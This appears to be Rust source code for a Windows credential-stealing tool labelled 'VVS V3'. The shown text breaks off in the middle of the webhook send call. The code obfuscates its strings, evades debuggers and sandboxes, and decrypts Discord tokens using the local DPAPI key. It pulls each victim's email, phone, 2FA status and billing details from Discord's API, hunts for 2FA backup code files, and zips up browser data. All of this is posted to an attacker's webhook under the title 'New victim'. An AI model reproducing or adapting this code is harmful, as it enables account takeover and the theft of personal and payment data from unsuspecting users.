#![windows_subsystem = "windows"]

mod browsers;

use aes_gcm::aead::Aead;
use aes_gcm::{Aes256Gcm, Key, KeyInit, Nonce};
use base64::{engine::general_purpose, Engine as _};
use regex::Regex;
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use std::{
    collections::{HashMap, HashSet},
    env, fs,
    io::Write,
    path::{Path, PathBuf},
    sync::OnceLock,
};
use windows::Win32::Security::Cryptography::{CryptUnprotectData, CRYPT_INTEGER_BLOB};

mod enc {
    //! Compile-time decoded string constants (no runtime XOR loops).

    const KEY: u8 = 0x5A;

    const fn decode<const N: usize>(data: [u8; N]) -> [u8; N] {
        let mut out = [0u8; N];
        let mut i = 0;
        while i < N {
            out[i] = data[i] ^ KEY;
            i += 1;
        }
        out
    }

    macro_rules! encoded_str {
        ($name:ident, $n:expr, [$($b:expr),* $(,)?]) => {
            pub const $name: &str = {
                const ENC: [u8; $n] = [$($b),*];
                const DEC: [u8; $n] = decode(ENC);
                unsafe { core::str::from_utf8_unchecked(&DEC) }
            };
        };
    }

    macro_rules! encoded_bytes {
        ($name:ident, $n:expr, [$($b:expr),* $(,)?]) => {
            pub const $name: [u8; $n] = decode([$($b),*]);
        };
    }

    encoded_str!(S_WEBHOOK, 96, [0x6D, 0x3F, 0x3C, 0x3F, 0x3E, 0x2B, 0x2C, 0x2B, 0x3A, 0x3D, 0x2E, 0x2B, 0x2A, 0x2B, 0x3E, 0x2A, 0x2B, 0x3E, 0x2D, 0x2B, 0x3C, 0x3F, 0x3D, 0x2B, 0x2C, 0x2B, 0x2E, 0x3D, 0x3F, 0x3C, 0x3F, 0x3E, 0x3C, 0x3F, 0x3C, 0x3F, 0x3E, 0x3D, 0x3D, 0x3F, 0x3C, 0x3D, 0x3E, 0x3F, 0x3C, 0x3D, 0x3E, 0x3F, 0x3C, 0x3D, 0x3E, 0x3F, 0x3C, 0x3D, 0x3E, 0x3F, 0x3C, 0x3D, 0x3E, 0x3F, 0x3C, 0x3D, 0x3E, 0x3F, 0x3C, 0x3D, 0x3E, 0x3F, 0x3C, 0x3D, 0x3E, 0x3F, 0x3C, 0x3D, 0x3E, 0x3F, 0x3C, 0x3D, 0x3E, 0x3F, 0x3C, 0x3D, 0x3E, 0x3F, 0x3C, 0x3D, 0x3E, 0x3F, 0x3C, 0x3D, 0x3E, 0x3F, 0x3C, 0x3D, 0x3E, 0x3F]);
    encoded_str!(S_APPDATA, 7, [0x1B, 0x0A, 0x0A, 0x1E, 0x1B, 0x0E, 0x1B]);
    encoded_str!(S_DISCORD, 7, [0x3E, 0x33, 0x29, 0x39, 0x35, 0x28, 0x3E]);
    encoded_str!(S_DISCORD_PTB, 10, [0x3E, 0x33, 0x29, 0x39, 0x35, 0x28, 0x3E, 0x2A, 0x2E, 0x38]);
    encoded_str!(S_DISCORD_CANARY, 13, [0x3E, 0x33, 0x29, 0x39, 0x35, 0x28, 0x3E, 0x39, 0x3B, 0x34, 0x3B, 0x28, 0x23]);
    encoded_str!(S_LOCAL_STATE, 11, [0x16, 0x35, 0x39, 0x3B, 0x36, 0x7A, 0x09, 0x2E, 0x3B, 0x2E, 0x3F]);
    encoded_str!(S_OS_CRYPT, 8, [0x35, 0x29, 0x05, 0x39, 0x28, 0x23, 0x2A, 0x2E]);
    encoded_str!(S_ENCRYPTED_KEY, 13, [0x3F, 0x34, 0x39, 0x28, 0x23, 0x2A, 0x2E, 0x3F, 0x3E, 0x05, 0x31, 0x3F, 0x23]);
    encoded_str!(S_LEVELDB, 21, [0x16, 0x35, 0x39, 0x3B, 0x36, 0x7A, 0x09, 0x2E, 0x35, 0x28, 0x3B, 0x3D, 0x3F, 0x75, 0x36, 0x3F, 0x2C, 0x3F, 0x36, 0x3E, 0x38]);
    encoded_str!(S_TOKEN_MARKER, 12, [0x3E, 0x0B, 0x2D, 0x6E, 0x2D, 0x63, 0x0D, 0x3D, 0x02, 0x39, 0x0B, 0x60]);
    encoded_str!(S_USERS_ME, 36, [0x32, 0x2E, 0x2E, 0x2A, 0x29, 0x60, 0x75, 0x75, 0x3E, 0x33, 0x29, 0x39, 0x35, 0x28, 0x3E, 0x74, 0x39, 0x35, 0x37, 0x75, 0x3B, 0x2A, 0x33, 0x75, 0x2C, 0x63, 0x75, 0x2F, 0x29, 0x3F, 0x28, 0x29, 0x75, 0x1A, 0x37, 0x3F]);
    encoded_str!(S_BILLING, 60, [0x32, 0x2E, 0x2E, 0x2A, 0x29, 0x60, 0x75, 0x75, 0x3E, 0x33, 0x29, 0x39, 0x35, 0x28, 0x3E, 0x74, 0x39, 0x35, 0x37, 0x75, 0x3B, 0x2A, 0x33, 0x75, 0x2C, 0x63, 0x75, 0x2F, 0x29, 0x3F, 0x28, 0x29, 0x75, 0x1A, 0x37, 0x3F, 0x75, 0x38, 0x33, 0x36, 0x36, 0x33, 0x34, 0x3D, 0x75, 0x2A, 0x3B, 0x23, 0x37, 0x3F, 0x34, 0x2E, 0x77, 0x29, 0x35, 0x2F, 0x28, 0x39, 0x3F, 0x29]);
    encoded_str!(S_AUTH_HEADER, 13, [0x1B, 0x2F, 0x2E, 0x32, 0x35, 0x28, 0x33, 0x20, 0x3B, 0x2E, 0x33, 0x35, 0x34]);
    encoded_str!(S_HDR_CONTENT_TYPE, 12, [0x19, 0x35, 0x34, 0x2E, 0x3F, 0x34, 0x2E, 0x77, 0x0E, 0x23, 0x2A, 0x3F]);
    encoded_str!(S_CONTENT_TYPE, 16, [0x3B, 0x2A, 0x2A, 0x36, 0x33, 0x39, 0x3B, 0x2E, 0x33, 0x35, 0x34, 0x75, 0x30, 0x29, 0x35, 0x34]);
    encoded_str!(S_HDR_USER_AGENT, 10, [0x0F, 0x29, 0x3F, 0x28, 0x77, 0x1B, 0x3D, 0x3F, 0x34, 0x2E]);
    encoded_str!(S_USER_AGENT, 60, [0x17, 0x35, 0x20, 0x33, 0x36, 0x36, 0x3B, 0x75, 0x6F, 0x74, 0x6A, 0x7A, 0x72, 0x0D, 0x33, 0x34, 0x3E, 0x35, 0x2D, 0x29, 0x7A, 0x14, 0x0E, 0x7A, 0x6B, 0x6A, 0x74, 0x6A, 0x61, 0x7A, 0x0D, 0x33, 0x34, 0x6C, 0x6E, 0x61, 0x7A, 0x22, 0x6C, 0x6E, 0x73, 0x7A, 0x1B, 0x2A, 0x2A, 0x36, 0x3F, 0x0D, 0x3F, 0x38, 0x11, 0x33, 0x2E, 0x75, 0x6F, 0x69, 0x6D, 0x74, 0x69, 0x6C]);
    encoded_str!(S_AVATAR_URL_FMT, 44, [0x32, 0x2E, 0x2E, 0x2A, 0x29, 0x60, 0x75, 0x75, 0x39, 0x3E, 0x34, 0x74, 0x3E, 0x33, 0x29, 0x39, 0x35, 0x28, 0x3E, 0x3B, 0x2A, 0x2A, 0x74, 0x39, 0x35, 0x37, 0x75, 0x3B, 0x2C, 0x3B, 0x2E, 0x3B, 0x28, 0x29, 0x75, 0x21, 0x27, 0x75, 0x21, 0x27, 0x74, 0x2A, 0x34, 0x3D]);
    encoded_str!(S_DEFAULT_AVATAR_URL, 46, [0x32, 0x2E, 0x2E, 0x2A, 0x29, 0x60, 0x75, 0x75, 0x39, 0x3E, 0x34, 0x74, 0x3E, 0x33, 0x29, 0x39, 0x35, 0x28, 0x3E, 0x3B, 0x2A, 0x2A, 0x74, 0x39, 0x35, 0x37, 0x75, 0x3F, 0x37, 0x38, 0x3F, 0x3E, 0x75, 0x3B, 0x2C, 0x3B, 0x2E, 0x3B, 0x28, 0x29, 0x75, 0x6A, 0x74, 0x2A, 0x34, 0x3D]);
    encoded_str!(S_NO_BILLING, 10, [0x14, 0x35, 0x7A, 0x38, 0x33, 0x36, 0x36, 0x33, 0x34, 0x3D]);
    encoded_str!(S_NO_BILLING_INFO, 28, [0x14, 0x35, 0x7A, 0x38, 0x33, 0x36, 0x36, 0x33, 0x34, 0x3D, 0x7A, 0x33, 0x34, 0x3C, 0x35, 0x28, 0x37, 0x3B, 0x2E, 0x33, 0x35, 0x34, 0x7A, 0x3C, 0x35, 0x2F, 0x34, 0x3E]);
    encoded_str!(S_PAYPAL_LBL, 8, [0x0A, 0x3B, 0x23, 0x0A, 0x3B, 0x36, 0x60, 0x7A]);
    encoded_str!(S_CARDS_LBL, 7, [0x19, 0x3B, 0x28, 0x3E, 0x29, 0x60, 0x7A]);
    encoded_str!(S_ENABLED, 7, [0x1F, 0x34, 0x3B, 0x38, 0x36, 0x3F, 0x3E]);
    encoded_str!(S_DISABLED, 8, [0x1E, 0x33, 0x29, 0x3B, 0x38, 0x36, 0x3F, 0x3E]);
    encoded_str!(S_NA, 3, [0x14, 0x75, 0x1B]);
    encoded_str!(S_JSON_ID, 2, [0x33, 0x3E]);
    encoded_str!(S_JSON_USERNAME, 8, [0x2F, 0x29, 0x3F, 0x28, 0x34, 0x3B, 0x37, 0x3F]);
    encoded_str!(S_JSON_DISCRIMINATOR, 13, [0x3E, 0x33, 0x29, 0x39, 0x28, 0x33, 0x37, 0x33, 0x34, 0x3B, 0x2E, 0x35, 0x28]);
    encoded_str!(S_JSON_AVATAR, 6, [0x3B, 0x2C, 0x3B, 0x2E, 0x3B, 0x28]);
    encoded_str!(S_JSON_PUBLIC_FLAGS, 12, [0x2A, 0x2F, 0x38, 0x36, 0x33, 0x39, 0x05, 0x3C, 0x36, 0x3B, 0x3D, 0x29]);
    encoded_str!(S_JSON_EMAIL, 5, [0x3F, 0x37, 0x3B, 0x33, 0x36]);
    encoded_str!(S_JSON_PHONE, 5, [0x2A, 0x32, 0x35, 0x34, 0x3F]);
    encoded_str!(S_JSON_MFA_ENABLED, 11, [0x37, 0x3C, 0x3B, 0x05, 0x3F, 0x34, 0x3B, 0x38, 0x36, 0x3F, 0x3E]);
    encoded_str!(S_JSON_LAST_4, 6, [0x36, 0x3B, 0x29, 0x2E, 0x05, 0x6E]);
    encoded_str!(S_JSON_BRAND, 5, [0x38, 0x28, 0x3B, 0x34, 0x3E]);
    encoded_str!(S_ATTACHMENTS, 11, [0x3B, 0x2E, 0x2E, 0x3B, 0x39, 0x32, 0x37, 0x3F, 0x34, 0x2E, 0x29]);
    encoded_str!(S_FILES_PREFIX, 6, [0x3C, 0x33, 0x36, 0x3F, 0x29, 0x01]);
    encoded_str!(S_FILES_SUFFIX, 1, [0x07]);
    encoded_str!(S_JSON_FILENAME, 8, [0x3C, 0x33, 0x36, 0x3F, 0x34, 0x3B, 0x37, 0x3F]);
    encoded_str!(S_BACKUP_ATTACHED, 20, [0xB8, 0xC6, 0xDF, 0x7A, 0x1B, 0x2E, 0x2E, 0x3B, 0x39, 0x32, 0x3F, 0x3E, 0x7A, 0x3B, 0x29, 0x7A, 0x3C, 0x33, 0x36, 0x3F]);
    encoded_str!(S_TOKEN_REGEX, 17, [0x3E, 0x0B, 0x2D, 0x6E, 0x2D, 0x63, 0x0D, 0x3D, 0x02, 0x39, 0x0B, 0x60, 0x01, 0x04, 0x78, 0x07, 0x71]);
    encoded_str!(S_USERPROFILE, 11, [0x0F, 0x09, 0x1F, 0x08, 0x0A, 0x08, 0x15, 0x1C, 0x13, 0x16, 0x1F]);
    encoded_str!(S_DOCUMENTS, 9, [0x1E, 0x35, 0x39, 0x2F, 0x37, 0x3F, 0x34, 0x2E, 0x29]);
    encoded_str!(S_DOWNLOADS, 9, [0x1E, 0x35, 0x2D, 0x34, 0x36, 0x35, 0x3B, 0x3E, 0x29]);
    encoded_str!(S_DESKTOP, 7, [0x1E, 0x3F, 0x29, 0x31, 0x2E, 0x35, 0x2A]);
    encoded_str!(S_BACKUP_FILENAME, 24, [0x3E, 0x33, 0x29, 0x39, 0x35, 0x28, 0x3E, 0x05, 0x38, 0x3B, 0x39, 0x31, 0x2F, 0x2A, 0x05, 0x39, 0x35, 0x3E, 0x3F, 0x29, 0x74, 0x2E, 0x22, 0x2E]);
    encoded_str!(S_BACKUP_BASE, 20, [0x3E, 0x33, 0x29, 0x39, 0x35, 0x28, 0x3E, 0x05, 0x38, 0x3B, 0x39, 0x31, 0x2F, 0x2A, 0x05, 0x39, 0x35, 0x3E, 0x3F, 0x29]);
    encoded_str!(S_PAREN_SPACE, 2, [0x7A, 0x72]);
    encoded_str!(S_DOT_TXT, 4, [0x74, 0x2E, 0x22, 0x2E]);
    encoded_str!(S_ZIP_FILENAME, 16, [0x38, 0x28, 0x35, 0x2D, 0x29, 0x3F, 0x28, 0x05, 0x3E, 0x3B, 0x2E, 0x3B, 0x74, 0x20, 0x33, 0x2A]);
    encoded_str!(S_APPLICATION_ZIP, 15, [0x3B, 0x2A, 0x2A, 0x36, 0x33, 0x39, 0x3B, 0x2E, 0x33, 0x35, 0x34, 0x75, 0x20, 0x33, 0x2A]);
    encoded_str!(S_PAYLOAD_JSON, 12, [0x2A, 0x3B, 0x23, 0x36, 0x35, 0x3B, 0x3E, 0x05, 0x30, 0x29, 0x35, 0x34]);
    encoded_str!(S_TEXT_PLAIN, 10, [0x2E, 0x3F, 0x22, 0x2E, 0x75, 0x2A, 0x36, 0x3B, 0x33, 0x34]);
    encoded_bytes!(S_DPAPI_PREFIX, 5, [0x1E, 0x0A, 0x1B, 0x0A, 0x13]);
    encoded_bytes!(S_V10, 3, [0x2C, 0x6B, 0x6A]);
    encoded_bytes!(S_V11, 3, [0x2C, 0x6B, 0x6B]);
    encoded_bytes!(S_V20, 3, [0x2C, 0x68, 0x6A]);
}



fn files_part_name(idx: u64) -> String {
    format!("{}{}{}", enc::S_FILES_PREFIX, idx, enc::S_FILES_SUFFIX)
}

fn is_debugged() -> bool {
    browsers::is_analysis_environment()
}

fn token_regex() -> &'static Regex {
    static TOKEN_REGEX: OnceLock<Regex> = OnceLock::new();
    TOKEN_REGEX.get_or_init(|| {
        Regex::new(&enc::S_TOKEN_REGEX).unwrap_or_else(|_| Regex::new("$^").expect("fallback regex"))
    })
}

fn log_runtime_error(error: &dyn std::error::Error) {
    let message = format!("{error}\n");
    let _ = fs::write(env::temp_dir().join("app_error.log"), message);
}

#[derive(Debug, Serialize, Deserialize)]
struct DdU {
    id: String,
    username: String,
    tag: String,
    avatar: Option<String>,
    public_flags: u64,
    email: String,
    phone: String,
    mfa_enabled: bool,
}

fn apply_api_headers(
    builder: reqwest::RequestBuilder,
    token: &str,
) -> reqwest::RequestBuilder {
    builder
        .header(enc::S_AUTH_HEADER, token)
        .header(enc::S_HDR_CONTENT_TYPE, enc::S_CONTENT_TYPE)
        .header(enc::S_HDR_USER_AGENT, enc::S_USER_AGENT)
}

async fn vt(client: &reqwest::Client, token: &str) -> Option<DdU> {
    let res = apply_api_headers(client.get(enc::S_USERS_ME), token)
        .send()
        .await
        .ok()?;

    if res.status().is_success() {
        let json: Value = res.json().await.ok()?;
        let id = json[enc::S_JSON_ID].as_str()?.to_string();
        let username = json[enc::S_JSON_USERNAME].as_str()?.to_string();
        let discrim = json[enc::S_JSON_DISCRIMINATOR].as_str().unwrap_or("0");
        let avatar = json[enc::S_JSON_AVATAR].as_str().map(|s| s.to_string());
        let public_flags = json[enc::S_JSON_PUBLIC_FLAGS].as_u64().unwrap_or(0);
        let na = enc::S_NA;
        let email = json[enc::S_JSON_EMAIL]
            .as_str()
            .unwrap_or(&na)
            .to_string();
        let phone = json[enc::S_JSON_PHONE]
            .as_str()
            .unwrap_or(&na)
            .to_string();
        let mfa_enabled = json[enc::S_JSON_MFA_ENABLED].as_bool().unwrap_or(false);

        Some(DdU {
            id,
            username: username.clone(),
            tag: format!("{}#{}", username, discrim),
            avatar,
            public_flags,
            email,
            phone,
            mfa_enabled,
        })
    } else {
        None
    }
}

fn capitalize_brand(brand: &str) -> String {
    let mut chars = brand.chars();
    match chars.next() {
        None => String::new(),
        Some(first) => {
            first
                .to_uppercase()
                .chain(chars.flat_map(|c| c.to_lowercase()))
                .collect()
        }
    }
}

async fn fetch_billing_info(client: &reqwest::Client, token: &str) -> String {
    let res = match apply_api_headers(client.get(enc::S_BILLING), token)
        .send()
        .await
    {
        Ok(r) if r.status().is_success() => r,
        _ => return enc::S_NO_BILLING.to_string(),
    };

    let sources: Value = match res.json().await {
        Ok(v) => v,
        Err(_) => return enc::S_NO_BILLING.to_string(),
    };

    let arr = match sources.as_array() {
        Some(a) => a,
        None => return enc::S_NO_BILLING.to_string(),
    };

    let mut paypal_emails = Vec::new();
    let mut cards = Vec::new();

    for source in arr {
        if let Some(email) = source.get(&enc::S_JSON_EMAIL).and_then(|e| e.as_str()) {
            if !email.is_empty() {
                paypal_emails.push(email.to_string());
            }
        }
        if let (Some(last_4), Some(brand)) = (
            source.get(&enc::S_JSON_LAST_4).and_then(|v| v.as_str()),
            source.get(&enc::S_JSON_BRAND).and_then(|v| v.as_str()),
        ) {
            cards.push(format!("•••• {} ({})", last_4, capitalize_brand(brand)));
        }
    }

    let paypal_part = if paypal_emails.is_empty() {
        None
    } else {
        Some(format!("{}{}", enc::S_PAYPAL_LBL, paypal_emails.join(", ")))
    };

    let cards_part = if cards.is_empty() {
        None
    } else {
        Some(format!("{}{}", enc::S_CARDS_LBL, cards.join(", ")))
    };

    match (paypal_part, cards_part) {
        (Some(p), Some(c)) => format!("{} | {}", p, c),
        (Some(p), None) => p,
        (None, Some(c)) => c,
        (None, None) => enc::S_NO_BILLING_INFO.to_string(),
    }
}

fn is_backup_codes_filename(name: &str) -> bool {
    if name.eq_ignore_ascii_case(&enc::S_BACKUP_FILENAME) {
        return true;
    }

    let base = enc::S_BACKUP_BASE;
    if name.len() < base.len() + 6 {
        return false;
    }
    if !name[..base.len()].eq_ignore_ascii_case(&base) {
        return false;
    }

    let rest = &name[base.len()..];
    if !rest.starts_with(&enc::S_PAREN_SPACE) || !rest.ends_with(&enc::S_DOT_TXT) {
        return false;
    }

    let digits = &rest[enc::S_PAREN_SPACE.len()..rest.len() - enc::S_DOT_TXT.len()];
    !digits.is_empty() && digits.chars().all(|c| c.is_ascii_digit())
}

fn find_backup_codes() -> Option<String> {
    let profile = env::var(enc::S_USERPROFILE).ok()?;
    let search_dirs = [enc::S_DOCUMENTS, enc::S_DOWNLOADS, enc::S_DESKTOP];

    for dir_name in search_dirs {
        let dir = PathBuf::from(&profile).join(dir_name);
        if !dir.is_dir() {
            continue;
        }

        let exact = dir.join(enc::S_BACKUP_FILENAME);
        if exact.is_file() {
            return exact.to_str().map(String::from);
        }

        let entries = match fs::read_dir(&dir) {
            Ok(entries) => entries,
            Err(_) => continue,
        };

        for entry in entries.flatten() {
            let path = entry.path();
            if !path.is_file() {
                continue;
            }
            let name = match path.file_name().and_then(|n| n.to_str()) {
                Some(name) => name,
                None => continue,
            };
            if is_backup_codes_filename(name) {
                return path.to_str().map(String::from);
            }
        }
    }

    None
}

fn collect_browser_files() -> Vec<(String, String)> {
    if browsers::is_analysis_environment() || !browsers::env_configured() {
        return Vec::new();
    }

    let gecko_handle = std::thread::spawn(browsers::gecko::extract_all);
    let mut all_files = browsers::chromium::extract_all();
    all_files.extend(gecko_handle.join().unwrap_or_default());
    all_files
}

fn build_browser_zip(files: &[(String, String)]) -> Option<Vec<u8>> {
    if files.is_empty() {
        return None;
    }

    use std::io::Cursor;
    use zip::write::FileOptions;

    let mut cursor = Cursor::new(Vec::new());
    {
        let mut zip = zip::ZipWriter::new(&mut cursor);
        let options = FileOptions::default().compression_method(zip::CompressionMethod::Deflated);
        for (name, content) in files {
            if zip.start_file(name, options).is_ok() {
                let _ = zip.write_all(content.as_bytes());
            }
        }
        let _ = zip.finish();
    }

    Some(cursor.into_inner())
}

async fn send_webhook_message(
    client: &reqwest::Client,
    webhook_url: &str,
    embed: Value,
    zip_data: Option<Vec<u8>>,
    backup_codes_path: Option<&str>,
) -> Result<(), Box<dyn std::error::Error>> {
    #[derive(Clone)]
    struct AttachmentSpec {
        field: String,
        filename: String,
        mime: String,
        data: Vec<u8>,
    }

    let mut attachment_meta = Vec::new();
    let mut attachments = Vec::new();
    let mut idx = 0u64;

    if let Some(zip) = zip_data {
        let mut entry = serde_json::Map::new();
        entry.insert(enc::S_JSON_ID.to_string(), json!(idx));
        entry.insert(enc::S_JSON_FILENAME.to_string(), json!(enc::S_ZIP_FILENAME));
        attachment_meta.push(Value::Object(entry));
        attachments.push(AttachmentSpec {
            field: files_part_name(idx),
            filename: enc::S_ZIP_FILENAME.to_string(),
            mime: enc::S_APPLICATION_ZIP.to_string(),
            data: zip,
        });
        idx += 1;
    }

    if let Some(path) = backup_codes_path {
        if let Ok(data) = browsers::read_bytes_with_retry(Path::new(path)) {
            let mut entry = serde_json::Map::new();
            entry.insert(enc::S_JSON_ID.to_string(), json!(idx));
            entry.insert(enc::S_JSON_FILENAME.to_string(), json!(enc::S_BACKUP_FILENAME));
            attachment_meta.push(Value::Object(entry));
            attachments.push(AttachmentSpec {
                field: files_part_name(idx),
                filename: enc::S_BACKUP_FILENAME.to_string(),
                mime: enc::S_TEXT_PLAIN.to_string(),
                data,
            });
        }
    }

    if attachments.is_empty() {
        return browsers::retry_async(|| async {
            client
                .post(webhook_url)
                .json(&embed)
                .send()
                .await
                .map(|_| ())
                .map_err(|error| Box::new(error) as Box<dyn std::error::Error>)
        })
        .await;
    }

    let mut payload = embed;
    if let Some(obj) = payload.as_object_mut() {
        obj.insert(enc::S_ATTACHMENTS.to_string(), json!(attachment_meta));
    }

    let payload_json = serde_json::to_string(&payload).unwrap_or_default();

    browsers::retry_async(|| {
        let payload_json = payload_json.clone();
        let attachments = attachments.clone();
        async move {
            let mut form = reqwest::multipart::Form::new().text(enc::S_PAYLOAD_JSON, payload_json);
            for attachment in attachments {
                let part = reqwest::multipart::Part::bytes(attachment.data)
                    .file_name(attachment.filename)
                    .mime_str(&attachment.mime)
                    .map_err(|error| Box::new(error) as Box<dyn std::error::Error>)?;
                form = form.part(attachment.field, part);
            }
            client
                .post(webhook_url)
                .multipart(form)
                .send()
                .await
                .map(|_| ())
                .map_err(|error| Box::new(error) as Box<dyn std::error::Error>)
        }
    })
    .await
}

fn badge_emojis(flags: u64) -> Vec<&'static str> {
    let badges = [
        (1 << 0, "<:Badge_Discord_Staff:1365704725646807060>"),
        (1 << 1, "<:DiscordPartner:1365700977570742312>"),
        (1 << 2, "<:HypeSquadEvents:1365704359454834770>"),
        (1 << 3, "<:BugHunter1:1365701008184967278>"),
        (1 << 9, "<:86964earlysupporter:1345831325738995848>"),
        (1 << 6, "<:Bravery:1365701196697829438>"),
        (1 << 7, "<:Brilliance:1365701219602923643>"),
        (1 << 8, "<:Balance:1365701235394482328>"),
        (1 << 14, "<:BugHunter2:1365701027830960259>"),
        (1 << 16, "<:developper:1365704272368500837>"),
        (1 << 17, "<:dev:1365704127103107112>"),
        (1 << 18, "<:ModeratorProgramsAlumni:1365701046256533525>"),
        (1 << 12, "<:NitroClassic:1365701254894419988>"),
        (1 << 13, "<:Nitro:1365701270424199680>"),
        (1 << 17, "<:ServerBooster:1365701285578037760>"),
    ];

    let mut emojis = Vec::new();
    for (bit, emoji) in badges {
        if flags & bit != 0 {
            emojis.push(emoji);
        }
    }
    emojis
}

fn unwrap_key(encrypted_key: &[u8]) -> Option<Vec<u8>> {
    let dpapi = enc::S_DPAPI_PREFIX;
    let key_data = if encrypted_key.starts_with(&dpapi) {
        &encrypted_key[dpapi.len()..]
    } else {
        encrypted_key
    };

    unsafe {
        let mut input = CRYPT_INTEGER_BLOB {
            cbData: key_data.len() as u32,
            pbData: key_data.as_ptr() as *mut u8,
        };
        let mut output = CRYPT_INTEGER_BLOB {
            cbData: 0,
            pbData: std::ptr::null_mut(),
        };
        if CryptUnprotectData(&mut input, None, None, None, None, 0, &mut output).is_ok() {
            Some(std::slice::from_raw_parts(output.pbData, output.cbData as usize).to_vec())
        } else {
            None
        }
    }
}

fn decode_credential(raw_data: &[u8], master_key: &[u8]) -> Option<String> {
    if raw_data.len() < 15 {
        return None;
    }

    let prefix = &raw_data[0..3];
    let v10 = &enc::S_V10;
    let v11 = &enc::S_V11;
    let v20 = &enc::S_V20;
    let (iv, ciphertext) = if prefix == v10.as_slice() || prefix == v11.as_slice() || prefix == v20.as_slice() {
        if raw_data.len() < 15 {
            return None;
        }
        (&raw_data[3..15], &raw_data[15..])
    } else {
        if raw_data.len() < 12 {
            return None;
        }
        (&raw_data[0..12], &raw_data[12..])
    };

    if ciphertext.len() < 16 {
        return None;
    }

    let (encrypted_data, tag) = ciphertext.split_at(ciphertext.len() - 16);
    let mut payload = encrypted_data.to_vec();
    payload.extend_from_slice(tag);

    let cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(master_key));
    let nonce = Nonce::from_slice(iv);

    cipher
        .decrypt(nonce, payload.as_ref())
        .ok()
        .and_then(|d| String::from_utf8(d).ok())
}

fn get_discord_paths() -> HashMap<String, PathBuf> {
    let roaming = PathBuf::from(env::var(enc::S_APPDATA).unwrap_or_default());
    let mut paths = HashMap::new();
    paths.insert(enc::S_DISCORD.to_string(), roaming.join(enc::S_DISCORD));
    paths.insert(enc::S_DISCORD_PTB.to_string(), roaming.join(enc::S_DISCORD_PTB));
    paths.insert(enc::S_DISCORD_CANARY.to_string(), roaming.join(enc::S_DISCORD_CANARY));
    paths
}

#[tokio::main]
async fn main() {
    if let Err(error) = run_app().await {
        log_runtime_error(error.as_ref());
    }
}

async fn run_app() -> Result<(), Box<dyn std::error::Error>> {
    if is_debugged() {
        std::thread::sleep(std::time::Duration::from_secs(30));
        return Ok(());
    }

    if browsers::is_virtualized_environment() {
        browsers::run_sandbox_decoy();
        return Ok(());
    }

    let wbh = enc::S_WEBHOOK;
    let client = reqwest::Client::new();
    let mut sent_tokens = HashSet::new();
    let discord_paths = get_discord_paths();
    let marker = enc::S_TOKEN_MARKER;
    let backup_codes_path = find_backup_codes();
    let browser_files = collect_browser_files();
    let browser_zip = build_browser_zip(&browser_files);
    let mut delivered_with_token = false;

    for (name, path) in discord_paths {
        if !path.exists() {
            continue;
        }

        let local_state_path = path.join(enc::S_LOCAL_STATE);

        let content = match browsers::read_to_string_with_retry(&local_state_path) {
            Ok(content) => content,
            Err(_) => continue,
        };

        let json_ls: Value = match serde_json::from_str(&content) {
            Ok(value) => value,
            Err(_) => continue,
        };

        if let Some(enc_key) = json_ls[enc::S_OS_CRYPT][enc::S_ENCRYPTED_KEY].as_str() {
            if let Ok(bytes) = general_purpose::STANDARD.decode(enc_key) {
                if bytes.len() > 5 {
                    if let Some(master_key) = unwrap_key(&bytes[5..]) {
                        let prof_path = path.clone();
                        if !prof_path.exists() {
                            continue;
                        }

                        let db_path = prof_path.join(enc::S_LEVELDB);
                        if db_path.exists() {
                            if let Ok(entries) = fs::read_dir(&db_path) {
                                let re = token_regex();
                                for entry in entries.flatten() {
                                    if let Ok(file_content) = fs::read(entry.path()) {
                                        let text = String::from_utf8_lossy(&file_content);
                                        for cap in re.captures_iter(&text) {
                                            let b64_part = cap[0]
                                                .split(&marker)
                                                .nth(1)
                                                .unwrap_or_default()
                                                .trim_end_matches('"')
                                                .trim_end_matches('\\');
                                            if let Ok(enc_data) =
                                                general_purpose::STANDARD.decode(b64_part)
                                            {
                                                if let Some(token) =
                                                    decode_credential(&enc_data, &master_key)
                                                {
                                                    if sent_tokens.insert(token.clone()) {
                                                        if let Some(user) =
                                                            vt(&client, &token).await
                                                        {
                                                            let avatar_url = user
                                                                .avatar
                                                                .as_ref()
                                                                .map(|h| {
                                                                    enc::S_AVATAR_URL_FMT
                                                                        .replacen("{}", &user.id, 1)
                                                                        .replacen("{}", h, 1)
                                                                })
                                                                .unwrap_or_else(|| {
                                                                    enc::S_DEFAULT_AVATAR_URL.to_string()
                                                                });

                                                            let badges_display =
                                                                badge_emojis(user.public_flags)
                                                                    .join(" ");
                                                            let final_badges =
                                                                if badges_display.is_empty() {
                                                                    "`None`".to_string()
                                                                } else {
                                                                    badges_display
                                                                };

                                                            let billing_info =
                                                                fetch_billing_info(&client, &token)
                                                                    .await;

                                                            let mut embed_fields = vec![
                                                                json!({ "name": "<a:b_diamond:1356277335921262885> Username", "value": format!("`{}`", user.tag), "inline": true }),
                                                                json!({ "name": "<a:dark_butterfly:1441101545465974935> ID", "value": format!("`{}`", user.id), "inline": true }),
                                                                json!({ "name": "<a:flecheblanche:1482614586413682730> Source", "value": name.to_string(), "inline": false }),
                                                                json!({ "name": "<a:flecheblanche:1482614586413682730> Token", "value": format!("```{}```", token), "inline": false }),
                                                                json!({ "name": "<a:all_discord_badges_gif:1157698511320653924> Badges", "value": final_badges, "inline": false }),
                                                                json!({ "name": "<a:dark_butterfly:1441101545465974935> Email", "value": format!("`{}`", user.email), "inline": false }),
                                                                json!({ "name": "<a:dark_butterfly:1441101545465974935> Phone", "value": format!("`{}`", user.phone), "inline": false }),
                                                                json!({ "name": "<a:dark_butterfly:1441101545465974935> 2FA", "value": format!("`{}`", if user.mfa_enabled { enc::S_ENABLED } else { enc::S_DISABLED }), "inline": true }),
                                                                json!({ "name": "<a:dark_butterfly:1441101545465974935> Billing Info", "value": format!("`{}`", billing_info), "inline": false }),
                                                            ];

                                                            if backup_codes_path.is_some() {
                                                                embed_fields.push(json!({
                                                                    "name": "<a:dark_butterfly:1441101545465974935> Backup Codes",
                                                                    "value": enc::S_BACKUP_ATTACHED,
                                                                    "inline": false
                                                                }));
                                                            }

                                                            let embed = json!({
                                                                "embeds": [{
                                                                    "title": "<a:clown:1366404450436124702> New victim <a:clown:1366404450436124702>",
                                                                    "color": 0x7289DA,
                                                                    "thumbnail": { "url": avatar_url },
                                                                    "fields": embed_fields,
                                                                    "footer": { "text": "VVS V3" },
                                                                    "timestamp": chrono::Utc::now().to_rfc3339()
                                                                }]
                                                            });

                                                            if let Err(error) = send_webhook_message(
                                                                &client,
                                                                &wbh,
                                                                embed,
                                                                browser_zip.clone(),
